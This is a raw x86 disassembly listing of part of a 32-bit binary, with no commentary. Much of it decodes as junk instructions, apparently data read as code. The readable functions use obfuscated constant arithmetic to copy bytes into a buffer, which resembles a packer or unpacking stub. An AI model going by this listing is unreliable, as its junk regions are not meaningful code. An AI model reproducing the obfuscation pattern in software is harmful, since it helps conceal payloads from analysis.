  409f70:	(bad)  
  409f71:	push   ds
  409f72:	sub    al,0xa2
  409f74:	jb     0x409f4f
  409f76:	fucomip st,st(0)
  409f78:	stc    
  409f79:	repz loopne 0x409f1d
  409f7c:	pop    ebx
  409f7d:	(bad)  [ebx-0x1992e9af]
  409f83:	scas   eax,DWORD PTR es:[edi]
  409f84:	push   edx
  409f85:	cmp    al,0x8d
  409f87:	cmp    eax,0x699e097a
  409f8c:	aas    
  409f8d:	cmp    DWORD PTR [esi+0x3e],edx
  409f90:	push   esp
  409f91:	and    DWORD PTR [ebx+edi*4-0x2e],esi
  409f95:	rcl    BYTE PTR [ecx-0x7c],0xe3
  409f99:	pop    esi
  409f9a:	aaa    
  409f9b:	leave  
  409f9c:	inc    esi
  409f9d:	sbb    eax,0x4da3edf3
  409fa2:	xchg   esi,eax
  409fa3:	mov    WORD PTR [edx-0x5cb2980a],fs
  409fa9:	xor    DWORD PTR [ebp+0x3cd17186],ebx
  409faf:	icebp  
  409fb0:	push   0x19
  409fb2:	bound  eax,QWORD PTR [edx-0x2f8b9e9]
  409fb8:	mul    BYTE PTR [edi]
  409fba:	mov    DWORD PTR [esi-0x17],eax
  409fbd:	jne    0x409ff3
  409fbf:	mov    al,0xc4
  409fc1:	repnz mov ds:0xabbebd7c,eax
  409fc7:	sub    al,BYTE PTR [esi]
  409fc9:	adc    BYTE PTR [esp+edx*4],0x83
  409fcd:	lea    ebp,[eax-0x5bd94027]
  409fd3:	sub    cl,BYTE PTR ds:0xcc355332
  409fd9:	dec    edx
  409fda:	cmp    BYTE PTR [edi-0x3594fc9],0x7f
  409fe1:	cdq    
  409fe2:	mov    al,ds:0xca2b824d
  409fe7:	arpl   ax,bx
  409fe9:	or     esp,DWORD PTR [edi+0x72ee6921]
  409fef:	add    DWORD PTR [ebp+0x6fee8098],ebp
  409ff5:	adc    DWORD PTR [ecx],ecx
  409ff7:	adc    DWORD PTR [ebp-0x4f],ebx
  409ffa:	ins    DWORD PTR es:[edi],dx
  409ffb:	call   0x9a14:0x819285b4
  40a002:	xchg   esi,eax
  40a003:	(bad)  
  40a004:	in     eax,0x90
  40a006:	shr    DWORD PTR [edi+0x5e],0x8
  40a00a:	push   edx
  40a00b:	mov    eax,ds:0x494e4eb9
  40a010:	cmp    al,0x75
  40a012:	add    ah,bh
  40a014:	xchg   BYTE PTR [ebx-0x7c],bh
  40a017:	xchg   edx,eax
  40a018:	fisttp WORD PTR [edi-0x7b]
  40a01b:	or     DWORD PTR [ebp+0x573740db],0x9f24f076
  40a025:	outs   dx,BYTE PTR ds:[esi]
  40a026:	pop    ebx
  40a027:	pusha  
  40a028:	cmc    
  40a029:	sti    
  40a02a:	pushf  
  40a02b:	push   ecx
  40a02c:	and    ebp,DWORD PTR [esi+edi*1+0x5e]
  40a030:	stos   BYTE PTR es:[edi],al
  40a031:	dec    edi
  40a032:	fnstcw WORD PTR [esi+0x16bd7267]
  40a038:	mov    al,dh
  40a03a:	sahf   
  40a03b:	add    ebp,0x41
  40a03e:	push   0xffffff97
  40a040:	fsubr  DWORD PTR [eax+0x63]
  40a043:	int    0xe9
  40a045:	mov    DWORD PTR [edx],edx
  40a047:	call   0x533373c1
  40a04c:	push   cs
  40a04d:	mov    edx,0xc7739ae2
  40a052:	pop    ebp
  40a053:	shl    BYTE PTR [ecx+0x21],0xca
  40a057:	mov    al,0x7a
  40a059:	add    eax,0xdd97cd51
  40a05e:	mov    dh,0x1a
  40a060:	push   0x488d00bd
  40a065:	fld    DWORD PTR [edx-0x5673ca81]
  40a06b:	repz inc ebp
  40a06d:	cld    
  40a06e:	mov    esi,0x5dbaa37b
  40a073:	call   0x4e92b160
  40a078:	adc    esi,0x361e3750
  40a07e:	sbb    DWORD PTR [edx-0x56],edx
  40a081:	loopne 0x40a059
  40a083:	push   esp
  40a084:	arpl   WORD PTR [ebp-0x36],bp
  40a087:	ret    0xc5ce
  40a08a:	outs   dx,DWORD PTR ds:[esi]
  40a08b:	pop    esi
  40a08c:	pop    ss
  40a08d:	push   esi
  40a08e:	loope  0x40a0bd
  40a090:	and    ecx,DWORD PTR [ecx-0x37]
  40a093:	sbb    ebx,DWORD PTR [esi]
  40a095:	and    esi,edi
  40a097:	lods   al,BYTE PTR ds:[esi]
  40a098:	sbb    esi,DWORD PTR [ebp+0x14]
  40a09b:	lds    ebp,FWORD PTR [ebx+0x6a]
  40a09e:	call   0x3557:0x7041c21d
  40a0a5:	mov    al,0x82
  40a0a7:	(bad)  
  40a0a8:	push   0x3767839e
  40a0ad:	or     eax,0x4d34e7b3
  40a0b2:	xlat   BYTE PTR ds:[ebx]
  40a0b3:	ds inc eax
  40a0b5:	jmp    0x9edfbeb
  40a0ba:	push   edx
  40a0bb:	or     dl,0xb9
  40a0be:	pop    ecx
  40a0bf:	loop   0x40a11e
  40a0c1:	test   eax,0x81a71e23
  40a0c6:	mov    dh,0xba
  40a0c8:	mov    DWORD PTR [ebp-0x7],ecx
  40a0cb:	cmc    
  40a0cc:	jge    0x40a0d6
  40a0ce:	mov    al,0x9d
  40a0d0:	cmp    ah,dl
  40a0d2:	aas    
  40a0d3:	or     bl,0xba
  40a0d6:	sub    DWORD PTR [esi+0x60],esp
  40a0d9:	not    ah
  40a0db:	shl    BYTE PTR [ebp-0x5f78203e],1
  40a0e1:	mov    esi,0x4ae11471
  40a0e6:	in     eax,dx
  40a0e7:	fwait
  40a0e8:	mov    eax,0x9f9c4105
  40a0ed:	adc    DWORD PTR [esi+0x4b],esi
  40a0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0f1:	mov    edx,DWORD PTR [ebp-0x14]
  40a0f4:	shrd   eax,edx,0x2
  40a0f8:	xor    eax,ecx
  40a0fa:	mov    ecx,DWORD PTR [ebp-0x18]
  40a0fd:	shr    edx,0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x422810,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a0e5
  40a134:	pop    eax
  40a135:	cmp    dl,BYTE PTR [edx-0x41416ada]
  40a13b:	test   eax,0x47bebec2
  40a140:	adc    bh,BYTE PTR [eax-0x3eaf5124]
  40a146:	add    eax,0x7f982356
  40a14b:	mov    ds:0x8da00473,eax
  40a150:	in     eax,dx
  40a151:	adc    eax,0xdbbefc78
  40a156:	pop    edi
  40a157:	sbb    BYTE PTR [edx+0x44],al
  40a15a:	out    0x2e,eax
  40a15c:	jno    0x40a1b4
  40a15e:	ds push eax
  40a160:	pop    edi
  40a161:	mov    bh,0x38
  40a163:	or     edx,DWORD PTR [si]
  40a166:	jp     0x40a145
  40a168:	popf   
  40a169:	call   0x6f556f9
  40a16e:	inc    edi
  40a16f:	(bad)  
  40a170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a171:	cmp    bh,dh
  40a173:	retf   
  40a174:	out    dx,al
  40a175:	retf   
  40a176:	sbb    BYTE PTR [ebx+ecx*4+0x5e210a66],al
  40a17d:	mov    ch,0x6d
  40a17f:	jl     0x40a1e9
  40a181:	js     0x40a1c8
  40a183:	mov    edx,esi
  40a185:	leave  
  40a186:	cmp    ecx,DWORD PTR [edi-0x82908c0]
  40a18c:	adc    eax,0xe8ee638
  40a191:	adc    eax,0x13a0514c
  40a196:	cmp    DWORD PTR [esi+ebp*4],0x62
  40a19a:	fcmovnbe st,st(1)
  40a19c:	pop    edi
  40a19d:	dec    edx
  40a19e:	adc    eax,0x92523091
  40a1a3:	fistp  QWORD PTR [edi+ecx*8]
  40a1a6:	test   BYTE PTR [edi+0x66],dl
  40a1a9:	adc    BYTE PTR [ebp+0x21826ba9],0x76
  40a1b0:	xchg   DWORD PTR [esi-0x1ac48f06],esi
  40a1b6:	pop    esp
  40a1b7:	xor    al,0x68
  40a1b9:	cmp    DWORD PTR [edx-0x2b],esi
  40a1bc:	fwait
  40a1bd:	lods   eax,DWORD PTR ds:[esi]
  40a1be:	clc    
  40a1bf:	xchg   bh,dh
  40a1c1:	pop    ds
  40a1c2:	xchg   ebx,eax
  40a1c3:	les    ecx,FWORD PTR [esi-0x73]
  40a1c6:	cmp    bl,BYTE PTR [ebx-0x21]
  40a1c9:	jnp    0x40a17b
  40a1cb:	mov    eax,ds:0x83a9d96f
  40a1d0:	pushf  
  40a1d1:	mov    eax,0xc52b8749
  40a1d6:	xor    dl,BYTE PTR [eax+0x75]
  40a1d9:	int3   
  40a1da:	push   ebp
  40a1db:	shl    BYTE PTR [esi],cl
  40a1dd:	mov    BYTE PTR [esi+0x4800455],bh
  40a1e3:	pushf  
  40a1e4:	mov    esi,0x13a7f8f6
  40a1e9:	nop
  40a1ea:	mov    ebp,DWORD PTR ds:0x479442fd
  40a1f0:	inc    ecx
  40a1f1:	shl    DWORD PTR [edi-0x13a9cba],0x4d
  40a1f8:	out    dx,al
  40a1f9:	(bad)  
  40a1fa:	pop    eax
  40a1fb:	leave  
  40a1fc:	call   0x51ca353a
  40a201:	cmc    
  40a202:	hlt    
  40a203:	into   
  40a204:	pop    esp
  40a205:	add    ah,bh
  40a207:	out    0xa8,al
  40a209:	mov    ds,WORD PTR [ebx+0x2b]
  40a20c:	hlt    
  40a20d:	jle    0x40a236
  40a20f:	fucom  st(5)
  40a211:	stos   DWORD PTR es:[edi],eax
  40a212:	cmp    DWORD PTR [ebx+0x4a7d8511],ebp
  40a218:	dec    edx
  40a219:	sbb    BYTE PTR [eax+ebx*4-0x64],dl
  40a21d:	test   DWORD PTR [esp+ebx*8],edx
  40a220:	cli    
  40a221:	and    bh,BYTE PTR [eax]
  40a223:	xadd   al,dh
  40a226:	xchg   esp,eax
  40a227:	mov    bl,0x12
  40a229:	mov    ?,eax
  40a22b:	sbb    eax,0xb3325ccf
  40a230:	mov    ss,edi
  40a232:	push   ebx
  40a233:	das    
  40a234:	ror    ebp,1
  40a236:	sub    DWORD PTR [esi-0x44],0x58
  40a23a:	xchg   ecx,eax
  40a23b:	test   BYTE PTR [eax+0x2f],ah
  40a23e:	inc    ebp
  40a23f:	dec    ebx
  40a240:	push   0xffffff87
  40a242:	pop    ds
  40a243:	jo     0x40a229
  40a245:	test   BYTE PTR [edx+0xba5446f],bh
  40a24b:	sbb    al,0x5d
  40a24d:	mov    gs,WORD PTR [esi-0x4d]
  40a250:	lea    eax,[eax-0x229af29a]
  40a256:	popa   
  40a257:	daa    
  40a258:	pusha  
  40a259:	test   eax,edx
  40a25b:	jne    0x40a2d0
  40a25d:	and    BYTE PTR [esi],0x26
  40a260:	fstp   st(0)
  40a262:	sbb    eax,0xbe919b14
  40a267:	sti    
  40a268:	addr16 dec edx
  40a26a:	pop    ebp
  40a26b:	outs   dx,DWORD PTR ds:[esi]
  40a26c:	popa   
  40a26d:	shl    DWORD PTR [eax],cl
  40a26f:	and    bh,dh
  40a271:	stc    
  40a272:	adc    DWORD PTR [ecx],ebx
  40a274:	mov    dh,0xdc
  40a276:	sbb    eax,DWORD PTR [edi]
  40a278:	adc    al,BYTE PTR [ebp+0x67]
  40a27b:	sub    BYTE PTR [edi-0x2dbaf511],bl
  40a281:	jbe    0x40a2e4
  40a283:	js     0x40a28e
  40a285:	mov    bh,0xb4
  40a287:	int3   
  40a288:	and    esp,DWORD PTR [eax-0x2c96b7bf]
  40a28e:	out    dx,eax
  40a28f:	jl     0x40a283
  40a291:	in     al,dx
  40a292:	inc    edx
  40a293:	outs   dx,DWORD PTR ds:[esi]
  40a294:	jns    0x40a2ef
  40a296:	arpl   WORD PTR [esi+0x38b80b53],di
  40a29c:	xor    DWORD PTR [eax+0x567c3b4],0x1e2ab522
  40a2a6:	inc    ebp
  40a2a7:	jp     0x40a295
  40a2a9:	push   edi
  40a2aa:	(bad)  
  40a2ac:	pop    esp
  40a2ad:	cs shr ah,1
  40a2b0:	mov    esp,0xeb7186a1
  40a2b5:	es sar esi,0xc2
  40a2b9:	sub    BYTE PTR [eax],bl
  40a2bb:	push   esp
  40a2bc:	jno    0x40a2e5
  40a2be:	jle    0x40a298
  40a2c0:	add    al,0x5e
  40a2c2:	sub    eax,0xb2037eaa
  40a2c7:	xchg   edi,eax
  40a2c8:	test   al,0x15
  40a2ca:	frstor [edx+0x59693767]
  40a2d0:	iret   
  40a2d1:	cmp    esp,DWORD PTR [eax-0x6d]
  40a2d4:	aam    0xde
  40a2d6:	cs dec esi
  40a2d8:	jae    0x40a2dd
  40a2da:	retf   0xa9c4
  40a2dd:	mov    ebx,0xb79aab35
  40a2e2:	bound  ebx,QWORD PTR [edx+0x7c]
  40a2e5:	nop
  40a2e6:	inc    edx
  40a2e7:	scas   eax,DWORD PTR es:[edi]
  40a2e8:	mov    esi,0x34724c1a
  40a2ed:	mov    al,ds:0x2f3f98d
  40a2f2:	pop    ebx
  40a2f3:	sbb    BYTE PTR [edx-0x44],ah
  40a2f6:	pop    ebx
  40a2f7:	or     al,0xd7
  40a2f9:	pop    edx
  40a2fa:	inc    ecx
  40a2fb:	lds    edi,FWORD PTR [eax]
  40a2fd:	sub    ebp,DWORD PTR [edi-0x69]
  40a300:	dec    eax
  40a301:	cmp    al,0xb1
  40a303:	pusha  
  40a304:	pop    ebx
  40a305:	fisub  WORD PTR [edi+edx*4-0x8b05e66]
  40a30c:	push   es
  40a30d:	mov    esi,0x4e3796c8
  40a312:	cmp    ah,BYTE PTR [edi+0x5b23682a]
  40a318:	(bad)  
  40a319:	pop    ebp
  40a31a:	push   ebp
  40a31b:	and    bh,bl
  40a31d:	adc    BYTE PTR [edi-0x73df03b9],al
  40a323:	fcmovnu st,st(4)
  40a325:	mov    ebp,0x13d66178
  40a32a:	xchg   esp,eax
  40a32b:	or     cl,dl
  40a32d:	and    BYTE PTR [ecx-0x2c790593],cl
  40a333:	xor    BYTE PTR [edi-0x6ef34f0e],cl
  40a339:	mov    edi,0x723948fa
  40a33e:	bound  edx,QWORD PTR [edi-0x3]
  40a341:	mov    fs,WORD PTR [edx-0x4f]
  40a344:	jmp    0xaee2:0xe2bd1228
  40a34b:	mov    ecx,0x48f9e75f
  40a350:	int    0x6e
  40a352:	fistp  QWORD PTR [edx+0x29]
  40a355:	stc    
  40a356:	call   0xcfaa:0xbcd0d42e
  40a35d:	repnz inc ebp
  40a35f:	je     0x40a319
  40a361:	sahf   
  40a362:	out    dx,eax
  40a363:	inc    ebx
  40a364:	add    ah,ch
  40a366:	les    edx,FWORD PTR [edx+edx*8]
  40a369:	or     DWORD PTR [edx-0x5a],0xf681447a
  40a370:	ds ss push cs
  40a373:	mov    eax,ds:0x90b0cf24
  40a378:	imul   esp,DWORD PTR [edi+0x2b8a68f4],0x76c2ef89
  40a382:	(bad)  
  40a383:	xor    bh,bh
  40a385:	dec    ecx
  40a386:	test   al,0xb7
  40a388:	push   ss
  40a389:	add    eax,0x51976057
  40a38e:	fdiv   st(1),st
  40a390:	in     al,0x70
  40a392:	lods   eax,DWORD PTR ds:[esi]
  40a393:	out    0xff,eax
  40a395:	or     DWORD PTR [edi+eiz*8+0x4e3619e4],esp
  40a39c:	(bad)  
  40a39e:	lods   eax,DWORD PTR ds:[esi]
  40a39f:	cmp    al,0x79
  40a3a1:	mov    ecx,0x7550a2bc
  40a3a6:	(bad)  
  40a3a7:	push   ebp
  40a3a8:	mov    ah,0xec
  40a3aa:	cmc    
  40a3ab:	es cli 
  40a3ad:	jns    0x40a422
  40a3af:	hlt    
  40a3b0:	or     eax,0x588d5bb9
  40a3b5:	adc    ebx,eax
  40a3b7:	mov    eax,ds:0xfc45c701
  40a3bc:	es inc edi
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	mov    ebp,0x119e50d9
  40a403:	fwait
  40a404:	mov    esi,0xbec2a9be
  40a409:	mov    esi,0x89fd0818
  40a40e:	sbb    al,0x9a
  40a410:	mov    ds:0xa5131d61,eax
  40a415:	inc    ebp
  40a416:	loop   0x40a3c1
  40a418:	retf   
  40a419:	add    edi,DWORD PTR [eax]
  40a41b:	aad    0x4d
  40a41d:	scas   al,BYTE PTR es:[edi]
  40a41e:	adc    eax,0xff2ed771
  40a423:	mov    bl,BYTE PTR [eax+0x17]
  40a426:	or     bl,0x80
  40a429:	xor    eax,0x363fdf57
  40a42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a430:	or     bl,al
  40a432:	mov    esp,0xe61a8f46
  40a437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a438:	add    eax,DWORD PTR [ebp+edx*2+0x1cd89c17]
  40a43f:	xchg   esi,eax
  40a440:	mov    al,ds:0x2eeab5dd
  40a445:	data16 xor al,al
  40a448:	scas   eax,DWORD PTR es:[edi]
  40a449:	jmp    0x40a431
  40a44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a44c:	xchg   BYTE PTR [eax-0x10],bl
  40a44f:	mov    ebp,0x1c17bf7f
  40a454:	fwait
  40a455:	dec    ecx
  40a456:	sar    DWORD PTR gs:[ebx],cl
  40a459:	into   
  40a45a:	or     al,BYTE PTR [edi*1+0x6d581f9b]
  40a461:	in     eax,dx
  40a462:	mov    bl,0x49
  40a464:	pop    esi
  40a465:	mov    ah,0x55
  40a467:	pushf  
  40a468:	jb     0x40a469
  40a46a:	cmp    DWORD PTR [esi],esi
  40a46c:	jnp    0x40a41f
  40a46e:	leave  
  40a46f:	dec    esi
  40a470:	pop    edi
  40a471:	mov    ch,0xb7
  40a473:	pop    esp
  40a474:	aas    
  40a475:	adc    DWORD PTR [ebx],edi
  40a477:	and    BYTE PTR [edi-0x30379fdf],dl
  40a47d:	jle    0x40a442
  40a47f:	in     eax,dx
  40a480:	cdq    
  40a481:	(bad)  
  40a482:	xlat   BYTE PTR ds:[ebx]
  40a483:	rcr    ah,cl
  40a485:	daa    
  40a486:	std    
  40a487:	cmc    
  40a488:	xor    al,dl
  40a48a:	and    edi,0x6166795
  40a490:	jnp    0x40a4eb
  40a492:	push   edi
  40a493:	in     al,0xee
  40a495:	int3   
  40a496:	or     BYTE PTR [edi],ch
  40a498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a499:	adc    eax,esi
  40a49b:	xchg   ecx,eax
  40a49c:	dec    esp
  40a49d:	imul   esi,DWORD PTR [edx+eiz*1-0x5a77a48f],0x1b
  40a4a5:	mov    al,0xa7
  40a4a7:	inc    cl
  40a4a9:	push   edx
  40a4aa:	out    0x45,eax
  40a4ac:	or     eax,0xf9ac16c4
  40a4b1:	call   0x26a77fee
  40a4b6:	imul   ebp,DWORD PTR [esi-0x4c],0x1a
  40a4ba:	dec    ebp
  40a4bb:	jp     0x40a44a
  40a4bd:	mov    ah,0x9d
  40a4bf:	cmp    eax,0x1bb28976
  40a4c4:	push   ebp
  40a4c5:	lea    edx,[edi-0x14f2197e]
  40a4cb:	xchg   esp,eax
  40a4cc:	xchg   edi,eax
  40a4cd:	adc    al,0xfc
  40a4cf:	jg     0x40a453
  40a4d1:	jp     0x40a54c
  40a4d3:	mov    bl,0xe4
  40a4d5:	xchg   esi,eax
  40a4d6:	cmp    esp,0xedbcc7a3
  40a4dc:	sbb    eax,ecx
  40a4de:	xchg   BYTE PTR [ebx+0x15],bh
  40a4e1:	mov    ebp,0xec2360b0
  40a4e6:	test   BYTE PTR [esi-0x1c],ah
  40a4e9:	or     eax,0x47531ae9
  40a4ee:	mov    dh,0x48
  40a4f0:	xchg   ecx,eax
  40a4f1:	ret    
  40a4f2:	mov    al,ds:0xfcc4d36a
  40a4f7:	cmp    BYTE PTR [ecx],ah
  40a4f9:	push   esp
  40a4fa:	fsubr  DWORD PTR [esi]
  40a4fc:	das    
  40a4fd:	aaa    
  40a4fe:	int3   
  40a4ff:	pop    esp
  40a500:	mov    bh,0x8f
  40a502:	push   cs
  40a503:	and    al,0x9a
  40a505:	or     ch,BYTE PTR [eax]
  40a507:	gs mov esi,0xc71bb693
  40a50d:	push   ss
  40a50e:	nop
  40a50f:	shl    DWORD PTR [ebp-0x1e430847],cl
  40a515:	mov    ds:0x5b5302af,al
  40a51a:	cmp    DWORD PTR [ecx-0x6],esi
  40a51d:	cmp    edi,ebp
  40a51f:	mov    ebx,0x81a8ed49
  40a524:	dec    ebp
  40a525:	aad    0xb
  40a527:	and    bh,BYTE PTR [ebx-0x2e]
  40a52a:	ret    
  40a52b:	fs retf 
  40a52d:	(bad)  
  40a52e:	(bad)  
  40a52f:	test   BYTE PTR [edi+0x43368056],0x9a
  40a536:	lods   eax,DWORD PTR ds:[esi]
  40a537:	icebp  
  40a538:	xor    ebx,edx
  40a53a:	pop    edx
  40a53b:	push   ecx
  40a53c:	inc    esp
  40a53d:	cld    
  40a53e:	fwait
  40a53f:	or     eax,0x75320294
  40a544:	mov    ds:0x1308c8c9,eax
  40a549:	js     0x40a58b
  40a54b:	xchg   DWORD PTR [ebx-0x293ed6c5],eax
  40a551:	sub    cl,dh
  40a553:	and    ch,ch
  40a555:	dec    esi
  40a556:	push   ecx
  40a557:	into   
  40a558:	and    BYTE PTR [esi-0x4a91e8e3],ah
  40a55e:	clc    
  40a55f:	push   ebx
  40a560:	mov    bh,cl
  40a562:	aad    0x5
  40a564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a565:	call   ebx
  40a567:	fld    QWORD PTR [ebp+0x39]
  40a56a:	retf   0x94a0
  40a56d:	pop    edx
  40a56e:	leave  
  40a56f:	mov    edi,0xb19baf58
  40a574:	lods   al,BYTE PTR ds:[esi]
  40a575:	sar    BYTE PTR [esi],1
  40a577:	std    
  40a578:	mov    BYTE PTR ds:0xb62be855,bl
  40a57e:	sub    al,0xb0
  40a580:	sbb    DWORD PTR [ecx],eax
  40a582:	inc    esp
  40a583:	call   0xb0ee8034
  40a588:	pop    edx
  40a589:	add    edx,DWORD PTR [ecx+0x371d2e21]
  40a58f:	and    DWORD PTR ds:0x21d06986,0xb6f0f9e6
  40a599:	(bad)  
  40a59a:	cld    
  40a59b:	pop    esi
  40a59c:	jns    0x40a5b7
  40a59e:	fucomi st,st(2)
  40a5a0:	add    DWORD PTR [ecx+0x64664b4a],0xffffffaf
  40a5a7:	div    BYTE PTR [eax-0x18]
  40a5aa:	test   DWORD PTR [eax+0x46],esi
  40a5ad:	adc    al,0x86
  40a5af:	push   eax
  40a5b0:	push   cs
  40a5b1:	mov    dl,0x90
  40a5b3:	nop
  40a5b4:	dec    esi
  40a5b5:	mov    WORD PTR [edx+eax*8-0x3c],?
  40a5b9:	mov    edx,0x5347ce7c
  40a5be:	pop    ss
  40a5bf:	and    ah,BYTE PTR ds:0x49ec168
  40a5c5:	mov    dl,0x6b
  40a5c7:	inc    eax
  40a5c8:	pop    edi
  40a5c9:	fisttp WORD PTR [eax+edi*2+0x0]
  40a5cd:	jmp    0xb1f0:0xb5f9724c
  40a5d4:	dec    edi
  40a5d5:	lock mov cs,ebx
  40a5d8:	cwde   
  40a5d9:	jbe    0x40a568
  40a5db:	test   BYTE PTR [ebp+0x49],0x2c
  40a5df:	cmp    bh,BYTE PTR [eax]
  40a5e1:	add    eax,0x55cb61c
  40a5e6:	jae    0x40a5e0
  40a5e8:	in     al,dx
  40a5e9:	mov    ch,0x79
  40a5eb:	fld    TBYTE PTR [esp+edi*4-0x6f]
  40a5ef:	test   al,al
  40a5f1:	inc    edi
  40a5f2:	sub    al,0xcd
  40a5f4:	cmp    eax,0xd97731a
  40a5f9:	push   cs
  40a5fa:	repz pop ecx
  40a5fc:	scas   al,BYTE PTR es:[edi]
  40a5fd:	add    BYTE PTR [ecx-0x63],dh
  40a600:	daa    
  40a601:	sahf   
  40a602:	xchg   ebx,eax
  40a603:	jge    0x40a5d5
  40a605:	mov    al,ds:0x3c6ce0c3
  40a60a:	in     eax,dx
  40a60b:	inc    edi
  40a60c:	xor    eax,0xace7d8dd
  40a611:	cmc    
  40a612:	in     eax,0x98
  40a614:	jb     0x40a68f
  40a616:	sbb    DWORD PTR ds:0x6cfad0a2,edx
  40a61c:	xor    eax,0x8a5a89a0
  40a621:	dec    edi
  40a622:	cmp    dh,BYTE PTR [esi-0x53]
  40a625:	std    
  40a626:	cmp    bl,dl
  40a628:	scas   eax,DWORD PTR es:[edi]
  40a629:	inc    ebp
  40a62a:	daa    
  40a62b:	and    esp,DWORD PTR [ebp-0x1ade1837]
  40a631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a632:	sbb    cl,BYTE PTR [edx-0x68]
  40a635:	loopne 0x40a61a
  40a637:	scas   eax,DWORD PTR es:[edi]
  40a638:	call   0xb14a:0xac573184
  40a63f:	jmp    0x537e:0x1582913b
  40a646:	ror    DWORD PTR gs:[eax],1
  40a649:	xor    DWORD PTR [eax-0x33],ebp
  40a64c:	cld    
  40a64d:	call   0xebb2b0df
  40a652:	add    al,0x54
  40a654:	retf   
  40a655:	sub    al,0x7e
  40a657:	(bad)
  40a65a:	and    dh,BYTE PTR [eax-0x1]
  40a65d:	imul   eax,eax,0x412c479a
  40a663:	bound  ebx,QWORD PTR gs:[ebp-0x7c]
  40a667:	jbe    0x40a6dc
  40a669:	sub    ebp,esi
  40a66b:	out    dx,al
  40a66c:	mov    cl,0x2b
  40a66e:	sub    al,0xe5
  40a670:	arpl   dx,dx
  40a672:	popa   
  40a673:	push   ds
  40a674:	push   esi
  40a675:	ficomp WORD PTR [eax-0x29a63f7f]
  40a67b:	or     eax,0xd2ff3519
  40a680:	jle    0x40a646
  40a682:	xchg   esi,eax
  40a683:	push   cs
  40a684:	mov    DWORD PTR [ebp-0x18],ebx
  40a687:	mov    DWORD PTR [ebp-0x14],0x76b1
  40a68e:	mov    ecx,DWORD PTR [ebp-0x8]
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
  40a699:	add    ecx,DWORD PTR [ebp-0x10]
  40a69c:	imul   ecx,ecx,0x1f80
  40a6a2:	add    ecx,0x727e
  40a6a8:	xor    ecx,0x106c92f2
  40a6ae:	mov    DWORD PTR [ebp-0x8],0x113c
  40a6b5:	mov    DWORD PTR [ebp-0xc],0x3d61
  40a6bc:	mov    DWORD PTR [ebp-0x10],0x16e9
  40a6c3:	mov    DWORD PTR [ebp-0x4],0x21aa
  40a6ca:	mov    eax,DWORD PTR [ebp-0x10]
  40a6cd:	or     eax,0x3611
  40a6d2:	add    eax,DWORD PTR [ebp-0xc]
  40a6d5:	mov    edx,DWORD PTR [ebp-0x8]
  40a6d8:	and    eax,edx
  40a6da:	mov    edx,ecx
  40a6dc:	sub    edx,eax
  40a6de:	mov    eax,DWORD PTR [ebp-0x4]
  40a6e1:	mov    esi,DWORD PTR ds:0x422708
  40a6e7:	mov    esi,DWORD PTR [esi+0x1cc]
  40a6ed:	add    eax,0x6772
  40a6f2:	or     eax,0x1f24
  40a6f7:	sub    eax,0x7046
  40a6fc:	xor    eax,0x497a
  40a701:	sub    esi,eax
  40a703:	mov    eax,DWORD PTR [ebp+0x8]
  40a706:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40a70d:	mov    BYTE PTR [esi+ecx*1],al
  40a710:	mov    eax,DWORD PTR [ebp-0x14]
  40a713:	mov    esi,DWORD PTR [ebp-0x18]
  40a716:	and    eax,0x2389
  40a71b:	xor    eax,0x695
  40a720:	xor    edx,edx
  40a722:	div    esi
  40a724:	lea    ecx,[ecx+eax*1-0x2413]
  40a72b:	mov    eax,DWORD PTR [ebp-0x1c]
  40a72e:	add    eax,DWORD PTR [ebp-0x20]
  40a731:	mov    edx,DWORD PTR [ebp-0x24]
  40a734:	and    eax,edx
  40a736:	mov    edx,DWORD PTR [ebp-0x28]
  40a739:	imul   eax,edx
  40a73c:	mov    edx,0xd0c8f
  40a741:	sub    edx,eax
  40a743:	cmp    ecx,edx
  40a745:	jbe    0x40a6ae
  40a74b:	push   0x2
  40a74d:	pop    eax
  40a74e:	mov    DWORD PTR [ebp-0x1c],eax
  40a751:	mov    DWORD PTR [ebp-0x20],ebx
  40a754:	mov    DWORD PTR [ebp-0x24],0x5
  40a75b:	mov    DWORD PTR [ebp-0x28],0x6686
  40a762:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40a769:	mov    DWORD PTR [ebp-0x4],eax
  40a76c:	mov    DWORD PTR [ebp+0x8],0x739a
  40a773:	mov    DWORD PTR [ebp-0xc],0xf3a
